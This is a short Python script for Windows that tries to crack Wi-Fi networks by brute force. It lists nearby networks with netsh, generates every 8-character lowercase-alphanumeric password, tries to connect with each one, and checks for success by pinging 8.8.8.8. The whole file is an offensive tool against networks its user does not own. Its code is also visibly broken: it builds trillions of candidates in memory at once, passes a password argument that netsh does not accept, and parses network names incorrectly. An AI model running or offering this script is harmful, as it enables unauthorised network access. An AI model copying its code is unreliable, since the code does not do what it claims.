import itertools
import subprocess

# Set of possible characters for the password
password_characters = "0123456789abcdefghijklmnopqrstuvwxyz"

# Generate all possible 8-character combinations
password_combinations = itertools.product(password_characters, repeat=8)

# Convert the combinations to strings
password_list = [''.join(combination) for combination in password_combinations]

# Scan for available Wi-Fi networks
def scan_networks():
    subprocess.call(["netsh", "wlan", "show", "network", "mode=Bssid"])
    output = subprocess.check_output("netsh wlan show network mode=Bssid", shell=True)
    networks = output.split(b'\r\n')
    bssid_to_ssid = {}
    for network in networks:
        if b'SSID' in network:
            ssid = network.split(b':')[1].strip().decode('utf-8')
            bssid = network.split(b':')[2].strip().decode('utf-8')
            bssid_to_ssid[bssid] = ssid
    return bssid_to_ssid

# Attempt to connect to a network with a given password
def connect_to_network(bssid, password):
    subprocess.call(["netsh", "wlan", "connect", "name=" + bssid, "password=" + password, "interface=" + "Wi-Fi"])

# Main function
def main():
    networks = scan_networks()
    for bssid in networks:
        print(f"Trying passwords for network {networks[bssid]}...")
        for password in password_list:
            connect_to_network(bssid, password)
            if subprocess.call(["ping", "-n", "1", "8.8.8.8"]) == 0:
                print(f"Found the password for network {networks[bssid]}: {password}")
                break
            else:
                print(f"Failed to connect to network {networks[bssid]} with password {password}")

if __name__ == "__main__":
    main()